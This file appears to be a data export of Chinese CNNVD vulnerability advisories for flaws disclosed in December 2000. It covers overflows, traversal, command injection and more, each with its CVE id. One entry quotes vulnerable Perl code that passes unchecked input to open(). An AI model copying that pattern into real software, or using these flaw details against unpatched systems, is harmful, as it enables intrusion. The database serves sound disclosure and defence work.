+HP JetDirect多个DoS漏洞,CNNVD-200012-020,2000-12-11,2005-10-20,低危,授权问题,HP JetDirect printer card Firmware x.08.20及其早期版本的远程登录服务存在缓冲区溢出。远程攻击者导致服务拒绝。,CVE-2000-1063
+Windows 95和Windows 98 NETBIOS客户端拒绝服务漏洞,CNNVD-200012-070,2000-12-11,2005-05-02,低危,授权问题,Windows 95和Windows 98中NETBIOS客户端存在漏洞。远程攻击者可以通过改变文件分享服务返回未知的驱动类型导致服务拒绝，该漏洞导致客户端崩溃。,CVE-2000-1003
+Unixware SCO help http server search97.cgi CGI命令执行漏洞,CNNVD-200012-015,2000-12-11,2005-05-02,高危,授权问题,Unixware 7的SCO help http server的search97.cgi CGI脚本存在格式化字符串漏洞。远程攻击者可以借助queryText参数中的格式化字符执行任意命令。,CVE-2000-1014
+Poll It pollit.cgi漏洞,CNNVD-200012-021,2000-12-11,2005-05-02,超危,授权问题,Poll It 2.0版本的pollit.cgi存在漏洞。远程攻击者借助poll_options参数的shell元字符执行任意命令。,CVE-2000-1068
+HP OpenView Network Node Manager (NNM)权限提升漏洞,CNNVD-200012-005,2000-12-11,2005-05-02,中危,授权问题,HP OpenView Network Node Manager (NNM) 6.1及其之前版本的数据库配置脚本存在多个漏洞。本地用户可能可以借助不安全权限获取权限。,CVE-2000-1057
+TYPSoft FTP Server远程拒绝服务漏洞,CNNVD-200012-014,2000-12-11,2005-10-20,高危,授权问题,TYPSoft FTP Server 0.78及其之前的版本存在缓冲区溢出漏洞。远程攻击者可以借助超长USER，PASS，或CWD命令导致服务拒绝，并可能可以执行任意命令。,CVE-2000-1035
+Lotus Domino SMTP服务缓冲区溢出,CNNVD-200012-044,2000-12-11,2005-10-12,超危,授权问题,"Lotus Domino 5.0.4及其早期版本的SMTP服务存在缓冲区溢出。远程攻击者借助""MAIL FROM""命令的超长ENVID关键字导致服务拒绝和可能执行任意代码。",CVE-2000-1047
+Cisco Secure PIX Firewall漏洞,CNNVD-200012-075,2000-12-11,2005-05-02,低危,授权问题,Cisco Secure PIX Firewall 5.2(2)版本存在漏洞。远程攻击者可以利用PASV请求淹没服务器来确定目标FTP服务器的真实IP地址，该请求在制定确定模式下在响应中包含真实IP地址。,CVE-2000-1027
+HP-UX cu缓冲区溢出漏洞,CNNVD-200012-065,2000-12-11,2005-10-20,高危,授权问题,HP-UX 11.0版本中cu程序存在缓冲区溢出漏洞。本地用户借助超长-l命令行参数提升特权。,CVE-2000-1028
+Ultraseek搜索引擎漏洞,CNNVD-200012-029,2000-12-11,2005-05-02,低危,授权问题,Ultraseek 3.1和3.1.10版本的搜索引擎(也称为Inktomi搜索)存在漏洞。远程攻击者借助畸形URL导致服务拒绝。,CVE-2000-1019
+Alt-N MDaemon DoS漏洞,CNNVD-200012-054,2000-12-11,2005-10-20,中危,授权问题,Mdaemon 3.1.1及其早期版本的Worldclient存在堆溢出漏洞。远程攻击者借助超长URL导致服务拒绝和可能执行任意命令。,CVE-2000-1020
+iPlanet Web Server SHTML登录功能缓冲区溢出漏洞,CNNVD-200012-072,2000-12-11,2006-09-22,超危,授权问题,iPlanet Web Server 4.x版本中SHTML登录功能存在缓冲区溢出漏洞。远程攻击者借助具有.shtml扩展名的超长文件名执行任意命令。,CVE-2000-1077
+Extent RBS ISP web服务器目录遍历漏洞,CNNVD-200012-037,2000-12-11,2005-05-02,低危,路径遍历,Extent RBS ISP web服务器存在目录遍历漏洞。远程攻击者借助对Image参数的 .. (点 点)攻击读取敏感信息。,CVE-2000-1036
+XFCE xinitrc权限提升漏洞,CNNVD-200012-016,2000-12-11,2005-10-12,高危,授权问题,XFCE 3.5.1的默认配置会通过xinitrc程序中的“xhost + localhost”命令绕过Xauthority访问控制机制，本地用户可以利用该漏洞侦测X Windows通信并获取权限。,CVE-2000-1060
+ypbind缓冲区溢出漏洞,CNNVD-200012-041,2000-12-11,2005-05-02,超危,授权问题,ypbind 3.3版本存在缓冲区溢出漏洞。攻击者可能提升根特权。,CVE-2000-1041
+iPlanet证书管理系统和目录服务器目录遍历漏洞,CNNVD-200012-071,2000-12-11,2006-08-31,低危,路径遍历,"iPlanet证书管理系统4.2版本和目录服务器4.12版本存在目录遍历漏洞。远程攻击者借助Agent, End Entity或者Administrator服务中..（点 点）攻击读取任意文件。",CVE-2000-1075
+SuSE漏洞,CNNVD-200012-057,2000-12-11,2005-05-02,低危,授权问题,SuSE 6.4版本的Apache (httpd.conf)的默认配置包含/usr/doc目录的别名。远程攻击者借助/doc/packages URL的HTTP请求读取数据包文档和获得系统配置信息。,CVE-2000-1016
+Leif M. Wright ads.cgi远程执行任意命令漏洞,CNNVD-200102-023,2000-12-11,2006-08-16,超危,授权问题,"Leif Wright开发的ads.cgi程序是一个免费的广告轮换脚本。 ads.cgi存在一个安全问题，攻击者可能利用这个漏洞在WEB服务器上执行任意命令。 由于脚本没有检查用户输入的变量内容就直接使用open()打开，如果攻击者在变量中输入""|""以及shell命令，就可以以HTTPD进程的运行权限执行任意命令。 有问题的代码部分如下： ----code snippet---- $filename = ""$FORM{'file'}""; $datafile = ""$basedir"" . ""$filename""; .... open (INFO， ""$datafile"");",CVE-2001-0025
+Windows 、System Monitor ActiveX控件命令执行漏洞,CNNVD-200012-017,2000-12-11,2005-10-12,超危,授权问题,Windows 2000的System Monitor ActiveX控件存在缓冲区溢出漏洞。远程攻击者可以借助HTML源代码中的超长LogFileName参数执行任意命令，该漏洞也称为“ActiveX Parameter Validation”漏洞,CVE-2000-1034
+Allaire Jrun漏洞,CNNVD-200012-018,2000-12-11,2006-09-20,中危,授权问题,"Allaire JRun 3.0 http servlet server存在漏洞。远程攻击者借助包含超长"".""字符的字符串的URL导致服务拒绝。",CVE-2000-1049
+Mandrake Linux格式化字符串漏洞,CNNVD-200012-024,2000-12-11,2005-05-02,超危,授权问题,Mandrake Linux 7.1及其早期版本和可能其他Linux操作系统的ypserv存在格式化字符串漏洞。攻击者在构建没有vsyslog()函数的ypserv时提升根特权。,CVE-2000-1043
+多个供应商dump不安全环境变量漏洞,CNNVD-200012-058,2000-12-11,2005-10-20,高危,授权问题,Red Hat Linux 6.2版本的dump信任由RSH环境变量说明的路径名。本地用户通过修改RSH变量指向特洛伊木马程序获得根特权。,CVE-2000-1009
+OpenBSD photurisd格式字符串漏洞,CNNVD-200012-059,2000-12-11,2005-05-02,中危,授权问题,OpenBSD photurisd存在格式字符串漏洞。本地用户可以借助包含格式字符的配置文件目录名执行任意命令。,CVE-2000-1004
+LBNL tcpdump多个缓冲区溢出漏洞,CNNVD-200012-079,2000-12-11,2006-11-14,超危,授权问题,LBNL tcpdump存在多个缓冲区溢出漏洞。远程攻击者可以执行任意命令。,CVE-2000-1026
+CatSoft FTP 服务器强力攻击漏洞,CNNVD-200012-080,2000-12-11,2005-10-20,高危,授权问题,Serv-U FTP服务器存在漏洞。远程攻击者通过作为有效的用户（可能匿名）第一次登录绕过anti-hammering性能然后试图猜测其他用户的密码。,CVE-2000-1033
+Check Point Firewall漏洞,CNNVD-200012-053,2000-12-11,2005-05-02,低危,授权问题,Check Point Firewall-1 4.0及其早期版本的客户端认证界面对无效用户名和相对的无效密码产生不同出错消息。远程攻击者鉴定防火墙上有效用户名。,CVE-2000-1032
+ISC主机远程缓冲区溢出漏洞,CNNVD-200012-064,2000-12-11,2005-10-20,高危,授权问题,主机命令存在缓冲区溢出漏洞。远程攻击者可以借助对AXFR查询的超长响应执行任意命令。,CVE-2000-1029
+IBM AS/400 Firewall web管理界面漏洞,CNNVD-200012-023,2000-12-11,2005-05-02,低危,授权问题,IBM AS/400 Firewall的web管理界面存在漏洞。远程攻击者借助空的GET请求导致服务拒绝。,CVE-2000-1038
+iCal csstart权限提升漏洞,CNNVD-200012-012,2000-12-11,2005-05-02,高危,授权问题,iCal 2.1 Patch 2的csstart使用相关路径名安装libsocket和libnsl库，icsuser账户可以通过创建当前目录或父目录的库特洛伊木马获取根权限。,CVE-2000-1074
+Web CS&T CorporateTime蛮力攻击漏洞,CNNVD-200012-006,2000-12-11,2006-04-07,低危,授权问题,Web的CS&T CorporateTime会返回无效用户名和密码的不同错误信息，远程攻击者可以利用该漏洞确定服务器的有效用户名。,CVE-2000-1030
+Palm OS弱加密漏洞,CNNVD-200012-019,2000-12-11,2005-10-20,中危,授权问题,PalmOS 3.5.2及其早期版本使用弱加密存储用户密码。有实体访问Palm设备的攻击者解密密码和提升访问权限到该设备。,CVE-2000-1008
+iCal漏洞,CNNVD-200012-047,2000-12-11,2005-05-02,高危,授权问题,iCal 2.1版本的Patch 2安装许多有全域可写许可的文件。本地用户通过用特洛伊木马病毒替换iplncal.sh程序修改iCal配置和执行任意命令。,CVE-2000-1072
+FreeBSD setlocale函数漏洞,CNNVD-200012-032,2000-12-11,2007-05-11,高危,授权问题,FreeBSD 5.0及其早期版本和可能其他的操作系统的setlocale函数存在漏洞。本地用户借助LANG环境变量读取任意文件。,CVE-2000-1013
+eWave ServletExec权限许可漏洞,CNNVD-200012-077,2000-12-11,2005-05-02,超危,授权问题,eWave ServletExec 3.0C和之前版本不能限制对UploadServlet Java/JSP程序的访问，远程攻击者可以上传文件和执行任意命令。,CVE-2000-1024
+Microsoft IIS远东版畸形编码字符远程泄漏文件内容漏洞,CNNVD-200102-009,2000-12-13,2006-04-25,低危,授权问题,IIS是一款Windows NT/2000系统自带的的Web服务器软件，由Microsoft公司开发维护。IIS支持对一些特定文件名后缀(如.ASP、.IDC、.HTR)的文件请求执行进一步的处理，当服务器接到此类文件的请求时，每种后缀的文件由一个特定的DLL文件处理。ISM.DLL用于处理.HTR、.STM、.IDC为后缀的文件请求。 NSFOCUS安全小组发现微软IIS 4.0/5.0(远东版本)在处理包含不完整的双字节编码字符的HTTP请求时存在一个安全漏洞，导致WEB目录下的文件内容被泄漏给远程攻击者。 Microsoft IIS远东版包括中文(简体/繁体)、日文、韩文版，它们都是使用的双字节编码格式。当IIS接收到用户提交的一个HTTP请求时，如果文件名中包含非ASCII字符，IIS会检查这个字符是否为双字节编码中的前导字符(例如，日文的前导字符包含两段字符：0x81-0x9F， 0xE0-0xFC)。如果是前导字符，它会继续检查下一个字符是否为结尾字符。如果没有下一个字符，IIS会简单地丢弃这个前导字符，因为它并没有构成一个完整的双字节编码。然而，这种处理将导致IIS打开不同的文件而不是用户在请求中指定的文件。攻击者通过提交一个特殊格式的URL， 可以使IIS使用某个ISAPI动态链接库打开某种它所不能解释的类型的文件，并获得该文件的内容。依赖于系统安装的ISAPI应用程序的类型，攻击者可能获得WEB根目录或者虚拟目录下的文件内容，这些文件可以是普通文本文件(.asp、.ini、.asa等等)，也可以是二进制文件(.exe等等)。这个问题已经在IIS 4.0 + SP6中得到解决，然而IIS 5.0中再度出现了这个漏洞。此漏洞不影响包括英语版在内的其他语言版本的IIS 4.0/5.0。,CVE-2000-1090
+Alex Heiphetz Group EZShopper loadpage.cgi目录列表泄露漏洞,CNNVD-200101-111,2000-12-13,2012-11-28,低危,授权问题,EZShopper是一个基于Web的用Perl实现的电子商务软件包，由Alex Heiphetz Group公司开发和维护。 NSFOCUS安全小组发现AHG公司的EZshopper所带的loadpage.cgi脚本实现上存在输入验证漏洞，远程攻击者可以获得EZshopper目录的文件列表及其敏感文件内容。,CVE-2000-1092
+Windows NT Terminal Server Editions Cenroll控制项（xenroll.dll）漏洞,CNNVD-200012-081,2000-12-14,2005-10-20,低危,授权问题,Windows NT 4.0和Windows NT Server 4.0 SP6之前版本中Terminal Server Editions的Cenroll控制项（xenroll.dll）存在漏洞。远程攻击者通过在目标计算机上创建大量的任意文件导致服务拒绝（资源消耗）。,CVE-1999-1579
+Zope漏洞,CNNVD-200012-082,2000-12-16,2005-05-02,高危,授权问题,Zope 2.2.0到2.2.4版本不能正确执行对象构造函数如DTML类函数的legacy名的对象安全注册。攻击者执行未经批准的活动。,CVE-2000-1211
+BSD ftpd单字节缓冲区溢出漏洞,CNNVD-200102-049,2000-12-18,2005-05-02,超危,授权问题,源自4.x BSD的FTP服务器实现包含一个严重漏洞，可以远程获取root权限。 在replydirname()函数中存在单字节缓冲区溢出，此时会覆盖修改被保存的EBP寄存器，当replydirname()函数返回的时候，主调函数中EBP寄存器值被设置成修改后的值。如果主调函数不受此影响并开始正常返回，由于EBP寄存器值已经是修改后的值，提取用于返回的EIP寄存器值的时候并不是从正常位置提取，如果相关栈区在攻击者控制下，程序流程发生变化，此时可以继续采用传统缓冲区溢出技术进一步获取root权限。 如果系统支持匿名可写目录，比如存在incoming目录，该漏洞很容易成功。缺省情况下溢出条件不满足。此外，OpenBSD缺省情况下FTP服务是关闭的。,CVE-2001-0053
+Zope漏洞,CNNVD-200012-083,2000-12-18,2005-05-02,低危,授权问题,Zope 2.2.0到2.2.4版本不能正确执行保护Image和File对象的数据更新类函数。有DTML编辑特权的攻击者修改这些对象的原始数据。,CVE-2000-1212
+Samba Samba Web Administration Tool (SWAT)漏洞,CNNVD-200012-126,2000-12-19,2005-05-02,中危,授权问题,Samba 2.0.7版本Samba Web Administration Tool (SWAT)当相对于无效名称提供有效用户名时提供不同的出错信息。远程攻击者借助该漏洞识别服务器上的有效用户。,CVE-2000-0938
+mysql漏洞,CNNVD-200012-089,2000-12-19,2006-11-14,中危,授权问题,mysql (pam_mysql) 0.4.7之前版本的可插入认证模型在构造SQL语句时不能正确净化用户输入。攻击者获得纯文本密码或者无用信息。,CVE-2000-0957
+Hassan目录遍历漏洞,CNNVD-200012-091,2000-12-19,2005-05-02,低危,路径遍历,Hassan咨询的shop.cgi购物栏程序存在目录遍历漏洞。远程攻击者借助页参数的 .. (点 点)攻击读取任意文件。,CVE-2000-0921
+IMP漏洞,CNNVD-200012-103,2000-12-19,2005-05-02,低危,授权问题,IMP 2.2及其早期版本存在漏洞。攻击者通过修改attachment_name隐藏形式变量读取和删除任意文件，该漏洞导致IMP给攻击者发送作为附件的文件。,CVE-2000-0911
+SmartWin CyberOffice Shopping Cart漏洞,CNNVD-200012-099,2000-12-19,2005-10-12,高危,授权问题,"SmartWin CyberOffice Shopping Cart 2版本（也称为CyberShop）存在漏洞。远程攻击者通过改变隐藏的形式变量""Price""修改价格信息。",CVE-2000-0926
+GnoRPM漏洞,CNNVD-200012-182,2000-12-19,2005-05-02,低危,授权问题,GnoRPM 0.95之前版本存在漏洞。本地用户可以借助链接攻击修改任意文件。,CVE-2000-0948
+MailFile漏洞,CNNVD-200012-188,2000-12-19,2005-10-12,低危,授权问题,"MailFile 1.10版本中的mailfile.cgi CGI程序存在漏洞。远程攻击者可以通过规定POST请求中的""filename""参数中的目标文件名读取任意文件，然后该漏洞被电子邮件发送到""email""参数指定地址。",CVE-2000-0977
+WQuinn QuotaAdvisor漏洞,CNNVD-200012-176,2000-12-19,2005-05-02,低危,授权问题,WQuinn QuotaAdvisor 4.1版本存在漏洞。用户可以通过在目标共享上运行报告列出目录和文件。,CVE-2000-0928
+NetBSD Global漏洞,CNNVD-200012-169,2000-12-19,2005-05-02,超危,授权问题,NetBSD上的Global 3.55及其早期版本中的global.cgi CGI程序存在漏洞。远程攻击者可以通过shell元字符执行任意命令。,CVE-2000-0952
+Windows 2000平台Microsoft索引服务CiWebHitsFile组件跨站脚本攻击(CSS)漏洞,CNNVD-200012-152,2000-12-19,2006-09-01,中危,授权问题,Windows 2000平台Microsoft索引服务中CiWebHitsFile组件存在漏洞。远程攻击者借助.htw 请求中CiRestriction参数执行跨站脚本攻击(CSS)漏洞，又称为“索引服务跨站脚本”漏洞。,CVE-2000-0942
+FreeBSD fingerd读取任意文件漏洞,CNNVD-200012-154,2000-12-19,2005-05-02,低危,授权问题,FreeBSD 4.1.1版本fingerd存在漏洞。远程攻击者通过指定目标文件名而不是普通用户名来读取任意文件。,CVE-2000-0915
+CGI Script Center Auction Weaver Username / Bidfile目录遍历漏洞,CNNVD-200012-178,2000-12-19,2005-05-02,低危,授权问题,Auction Weaver 1.0到1.04 版本存在漏洞。远程攻击者可以借助用户名或bidfile表单域上的..(点 点)攻击读取任意文件。,CVE-2000-0811
+Red Hat Linux cyrus-sasl漏洞,CNNVD-200012-101,2000-12-19,2005-05-25,中危,授权问题,Red Hat Linux 7.0的cyrus-sasl 1.5.24之前版本不能正确对本地用户进行查证授权。用户绕过指定访问限制。,CVE-2000-0956
+OpenBSD IPSEC服务拒绝漏洞,CNNVD-200012-145,2000-12-19,2005-05-02,低危,授权问题,OpenBSD 2.7安装启用的IPSEC不能准确处理空AH/ESP数据包。远程攻击者可以导致服务拒绝。,CVE-2000-0962
+OpenBSD yp_passwd程序格式字符串漏洞,CNNVD-200012-129,2000-12-19,2005-08-22,高危,授权问题,OpenBSD yp_passwd程序（和可能其他基于BSD操作系统的程序）存在格式字符串漏洞。攻击者提升根目录特权的畸形名称。,CVE-2000-0995
+IIS劫持该用户安全web会话漏洞,CNNVD-200012-141,2000-12-19,2005-10-12,高危,授权问题,IIS 4.0和 5.0版本.ASP页面向安全和不安全的web会话发送相同Session ID cookie。如果用户移动到不安全会话，远程攻击者可以劫持该用户的安全web会话，也称为“会话ID cookie标记”漏洞。,CVE-2000-0970
+Horde库漏洞,CNNVD-200012-096,2000-12-19,2005-10-12,中危,授权问题,Horde库 1.02版本存在漏洞。攻击者借助“from”地址的shell元字符执行任意命令。,CVE-2000-0910
+BOA web服务器目录遍历漏洞,CNNVD-200012-125,2000-12-19,2006-09-22,低危,路径遍历,"BOA web server 0.94.8.2以及之前版本存在目录遍历漏洞。远程攻击者借助使用""%2E""代替"".""GET HTTP请求中修改的..（点 点）攻击读取任意文件。",CVE-2000-0920
+Microsoft Internet Explorer 安全漏洞,CNNVD-200012-118,2000-12-19,2021-07-26,高危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 5.5之前版本向前贮存的安全网站到同一网站的不安全页的用户证书。远程攻击者通过监控到web服务器连接获得证书，也称为“贮存web认证”漏洞。,CVE-2000-0982
+CGI Script Center Auction Weaver任意文件删除漏洞,CNNVD-200012-168,2000-12-19,2005-05-02,高危,授权问题,Auction Weaver 1.0 到1.04版本不能正确验证表单域的名称。远程攻击者借助..（点 点）攻击删除任意文件和目录。,CVE-2000-0810
+Catalyst web配置界面任意无认证命令执行漏洞,CNNVD-200012-161,2000-12-19,2005-05-02,超危,授权问题,Catalyst 3500 XL交换机web配置界面存在漏洞。当没有设置启用密码时，远程攻击者借助包含/exec/目录的URL执行任意无认证命令。,CVE-2000-0945
+Network Monitor Big Brother System bbd服务器执行任意命令漏洞,CNNVD-200012-167,2000-12-19,2006-04-07,高危,授权问题,"Network Monitor 1.5c2之前版本Big Brother System中bbd服务器存在漏洞。远程攻击者借助 ""&"" shell元字符执行任意命令。",CVE-2000-0978
+GnuPG(gpg)漏洞,CNNVD-200012-171,2000-12-19,2005-05-02,高危,授权问题,GnuPG(gpg)1.0.3版本不能正确检查含有多个文档文件的签名，攻击者可以修改所有文档的内容，并且第一个没有被检测。,CVE-2000-0974
+Shambala服务器服务拒绝漏洞,CNNVD-200012-132,2000-12-19,2006-08-24,低危,授权问题,Shambala Server 4.5版本存在漏洞。远程攻击者通过打开然后关闭连接导致服务拒绝。,CVE-2000-0953
+Multiple Vendor BSD eeprom格式字符串漏洞,CNNVD-200012-140,2000-12-19,2005-10-20,高危,授权问题,"OpenBSD, NetBSD,和可能其他操作系统中eeprom程序存在格式字符串漏洞。本地攻击者提升根目录特权。",CVE-2000-0997
+Half Life专用服务器格式化字符串漏洞,CNNVD-200012-088,2000-12-19,2005-05-02,超危,授权问题,Half Life专用服务器build 3104及其早期版本存在格式化字符串漏洞。远程攻击者借助系统控制台或者寄存器通过注入格式化字符串到变更级命令执行任意命令。,CVE-2000-0969
+CGI Script Center News Update漏洞,CNNVD-200012-179,2000-12-19,2005-05-02,高危,授权问题,CGI Script Center News Update 1.1版本不能正确验证密码更改操作过程中的原始新闻管理密码，远程攻击者可以在不知道原始密码的情况下修改密码。,CVE-2000-0944
+HP-UX VVOS TGA及Java Servlet代理NSAPI插件服务拒绝漏洞,CNNVD-200012-128,2000-12-19,2006-11-14,低危,授权问题,HP-UX VVOS 10.24 和11.04版本TGA及Java Servlet代理中NSAPI插件存在漏洞。攻击者导致服务拒绝（高CPU使用率）。,CVE-2000-0965
+cmd5checkpw服务拒绝漏洞,CNNVD-200012-180,2000-12-19,2005-10-12,中危,授权问题,"cmd5checkpw 0.21及其早期版本存在漏洞。远程攻击者可以借助具有未知用户名的""SMTP AUTH""命令导致服务拒绝。",CVE-2000-0990
+All-Mail缓冲区溢出漏洞,CNNVD-200012-147,2000-12-19,2005-10-20,超危,授权问题,"All-Mail 1.1版本存在缓冲区溢出漏洞。远程攻击者借助超长""MAIL FROM""或者""RCPT TO""命令执行任意命令。",CVE-2000-0985
+curl缓冲区溢出漏洞,CNNVD-200012-172,2000-12-19,2005-05-02,超危,授权问题,curl 6.0-1.1之前版本以及curl-ssl 6.0-1.2之前版本存在缓冲区溢出漏洞。远程攻击者可以通过强制产生超长错误信息执行任意命令。,CVE-2000-0973
+PHP格式字符串漏洞,CNNVD-200012-191,2000-12-19,2005-05-02,超危,授权问题,PHP 3和4不能净化注入用户格式字符串，远程攻击者可以通过触发没有被正确写进错误日志中的错误信息执行任意命令。,CVE-2000-0967
+SMTP MAILsweeper服务拒绝漏洞,CNNVD-200012-142,2000-12-19,2005-09-12,低危,授权问题,SMTP 3.x MAILsweeper不能正确处理ZIP文件和挂起中损坏的CDA文档。远程攻击者导致服务拒绝。,CVE-2000-0932
+Pegasus Mail读取任意文件漏洞,CNNVD-200012-151,2000-12-19,2005-05-02,低危,授权问题,Pegasus Mail 3.12版本存在漏洞。远程攻击者借助调用mailto的嵌入URL：A - F协议交换机读取任意文件。,CVE-2000-0930
+GNU Groff 安全漏洞,CNNVD-200012-123,2000-12-19,2021-05-11,超危,其他,GNU Groff使用当前的工作目录找到设备描述文件。本地用户通过包含描述文件中恶意postpro指令来提升额外特权，当其他用户运行groff时将被执行。,CVE-2000-0803
+Cisco Virtual Central Office漏洞,CNNVD-200012-095,2000-12-19,2005-10-20,低危,授权问题,Cisco Virtual Central Office 4000 (VCO/4K)在SNMP MIB储存用户名和密码时使用弱加密。知道团体名的攻击者破解密码和提升特权。,CVE-2000-0955
+PhotoAlbum getalbum.php漏洞,CNNVD-200012-177,2000-12-19,2005-10-20,低危,授权问题,PhotoAlbum 0.9.9之前版本中的getalbum.php存在漏洞。远程攻击者可以借助..（点 点）攻击读取任意文件。,CVE-2000-0902
+GNU CFEngine cfd守护程序格式化字符串漏洞,CNNVD-200012-102,2000-12-19,2005-05-02,高危,授权问题,GNU CFEngine 1.6.0a11之前版本的cfd守护程序存在格式化字符串漏洞。攻击者借助CAUTH命令的格式化字符执行任意命令。,CVE-2000-0947
+SmartWin CyberOffice Shopping Cart获得敏感信息漏洞,CNNVD-200012-139,2000-12-19,2005-05-02,低危,授权问题,SmartWin CyberOffice Shopping Cart 2版本（也称为CyberShop）安装带有全域可读权限_private目录。远程攻击者获得敏感信息。,CVE-2000-0925
+Red Hat Linux服务拒绝,CNNVD-200012-186,2000-12-19,2005-05-02,低危,授权问题,Red Hat Linux 5.2版本Glint存在漏洞。本地用户可以借助链接攻击浏览任意文件和导致服务拒绝。,CVE-2000-0934
+Microsoft Network Monitor (Netmon) HTTP协议分析器缓冲区溢出漏洞,CNNVD-200012-124,2000-12-19,2005-10-20,高危,授权问题,Microsoft Network Monitor (Netmon)的HTTP协议分析器存在缓冲区溢出漏洞。远程攻击者借助畸形数据执行任意命令，也称为“网络监视器协议解析”漏洞。,CVE-2000-0817
+QNX Voyager Webserver多个漏洞,CNNVD-200012-087,2000-12-19,2006-09-25,低危,授权问题,QNX 405的示范磁盘中Voyager web服务器2.01B版本的QNX嵌入式资源管理器存在漏洞。远程攻击者借助embedded.html web页读取敏感系统数据信息。,CVE-2000-0905
+Microsoft网络会议漏洞,CNNVD-200012-093,2000-12-19,2005-10-12,低危,授权问题,带远程桌面共享启用的Microsoft网络会议存在漏洞。远程攻击者借助一系列到网络会议端口的空字节导致服务拒绝（CPU 利用），也称为“网络桌面共享”漏洞。,CVE-2000-0983
+BIND named漏洞,CNNVD-200012-149,2000-12-19,2005-10-12,中危,授权问题,"BIND 8.2到8.2.2-P6版本中named存在漏洞。远程攻击者通过制作压缩区域传输（ZXFR）请求并执行一项非缓存的权威性记录名称服务查询，又称为""zxfr bug.""。",CVE-2000-0887
+"Windows 98, ME,以及2000平台上Hilgraeve, Inc. HyperTerminal客户端缓冲区溢出漏洞",CNNVD-200012-135,2000-12-19,2005-10-12,高危,授权问题,"Windows 98, ME,以及2000平台上Hilgraeve, Inc. HyperTerminal客户端存在缓冲区溢出漏洞。远程攻击者借助超长远程登录URL执行任意命令，也称为“超级终端缓冲区溢出”漏洞。",CVE-2000-0991
+Aplio PRO程序漏洞,CNNVD-200012-174,2000-12-19,2007-05-01,高危,授权问题,Aplio PRO中的authenticate.cgi CGI程序存在漏洞。远程攻击者可以借助password参数中的shell元字符执行任意命令。,CVE-2000-0923
+Samba漏洞,CNNVD-200012-086,2000-12-19,2005-05-02,高危,授权问题,Samba 2.0.7版本的Samba Web Administration Tool (SWAT)存在漏洞。本地用户借助cgi.log文件的符号链接攻击改写任意文件。,CVE-2000-0935
+bftp守护进程缓冲区溢出漏洞,CNNVD-200012-119,2000-12-19,2006-08-23,高危,授权问题,bftp守护进程(bftpd) 1.0.11版本存在缓冲区溢出漏洞。远程攻击者借助超长USER命令导致服务拒绝和可能执行任意命令。,CVE-2000-0943
+PHPix Photo Album目录遍历漏洞,CNNVD-200012-164,2000-12-19,2005-05-02,低危,路径遍历,PHPix Photo Album 1.0.2以及之前版本存在目录遍历漏洞。远程攻击者借助..（点 点）攻击读取任意文件。,CVE-2000-0919
+Samba Samba Web Administration Tool (SWAT)强力密码猜测漏洞,CNNVD-200012-160,2000-12-19,2005-05-02,高危,授权问题,Samba 2.0.7版本Samba Web Administration Tool (SWAT)不能记录用户名正确但是密码错误的登录尝试。远程攻击者执行强力密码猜测攻击。,CVE-2000-0937
+Oracle缓冲区溢出漏洞,CNNVD-200012-105,2000-12-19,2005-10-20,中危,授权问题,"Oracle 8.1.5版本应用程序如names,namesctl,onrsd,osslogin,tnslsnr,tnsping,trcasst, 和trcroute存在缓冲区溢出漏洞。本地用户可能借助超长ORACLE_HOME环境变量提升特权。",CVE-2000-0986
+Samba漏洞,CNNVD-200012-084,2000-12-19,2005-10-20,低危,授权问题,Samba 2.0.7版本的Samba Web Administration Tool (SWAT)存在漏洞。远程攻击者通过重复递交GET HTTP请求的不标准URL和强迫重新启动导致服务拒绝。,CVE-2000-0939
+BIND 安全漏洞,CNNVD-200012-127,2000-12-19,2020-12-10,低危,其他,"ISC BIND是美国ISC公司的一套实现了DNS协议的开源软件。 BIND 8.2到8.2.2-P6版本的named中存在安全漏洞。远程攻击者通过发送SRV记录给服务器导致服务拒绝，也称为""srv bug.""。",CVE-2000-0888
+thttpd ssi CGI程序目录遍历漏洞,CNNVD-200012-114,2000-12-19,2006-08-03,高危,路径遍历,"thttpd 2.19及其早期版本的ssi CGI程序存在目录遍历漏洞。远程攻击者借助""%2e%2e""字符串读取任意文件，该漏洞是 .. (点 点)攻击的变体。",CVE-2000-0900
+TIS防火墙工具包x-gw格式化字符串漏洞,CNNVD-200012-122,2000-12-19,2005-10-20,高危,授权问题,TIS防火墙工具包(FWTK)的x-gw存在格式化字符串漏洞。本地用户借助畸形显示名执行任意命令。,CVE-2000-0950
+Avirt Mail服务拒绝及执行任意命令漏洞,CNNVD-200012-138,2000-12-19,2009-04-03,超危,授权问题,"Avirt Mail 4.0和4.2版本存在漏洞。远程攻击者借助超长""RCPT TO""或者""MAIL FROM""命令导致服务拒绝并且可能执行任意命令。",CVE-2000-0971
+Oracle oidldapd存在缓冲区溢出漏洞,CNNVD-200012-159,2000-12-19,2005-10-20,中危,授权问题,"Oracle 8.1.6版本oidldapd存在缓冲区溢出漏洞。本地用户借助超长""connect""命令行参数提升特权。",CVE-2000-0987
+Xfree缓冲区溢出漏洞,CNNVD-200012-173,2000-12-19,2005-05-02,中危,授权问题,XFree 3.3.x版本中的xlib存在缓冲区溢出漏洞。本地用户可能借助超长DISPLAY环境变量或-display命令行参数执行任意命令。,CVE-2000-0976
+Samba Samba Web Administration Tool (SWAT)读取敏感信息漏洞,CNNVD-200012-162,2000-12-19,2005-05-02,低危,授权问题,Samba 2.0.7版本Samba Web Administration Tool (SWAT)安装带有全域可读权限cgi.log日志文件。本地用户读取例如用户名和密码的敏感信息。,CVE-2000-0936
+MultiHTML CGI读取任意文件及执行任意命令漏洞,CNNVD-200012-155,2000-12-19,2005-10-12,低危,授权问题,"MultiHTML CGI脚本存在漏洞。远程攻击者通过指定""multi""参数文件名读取任意文件并且可能执行任意命令。",CVE-2000-0912
+Oracle MySQL 安全漏洞,CNNVD-200012-092,2000-12-19,2019-10-25,高危,其他,Oracle MySQL是美国甲骨文（Oracle）公司的一套开源的关系数据库管理系统。 Oracle MySQL中存在安全漏洞。远程攻击者利用该漏洞恢复密码。,CVE-2000-0981
+Netscape Messaging Server缓冲区溢出漏洞,CNNVD-200012-181,2000-12-19,2006-10-06,高危,授权问题,Netscape Messaging Server 4.15 Patch 2版本中的IMAP服务器存在缓冲区溢出漏洞。本地用户可以借助超长LIST命令执行任意命令。,CVE-2000-0961
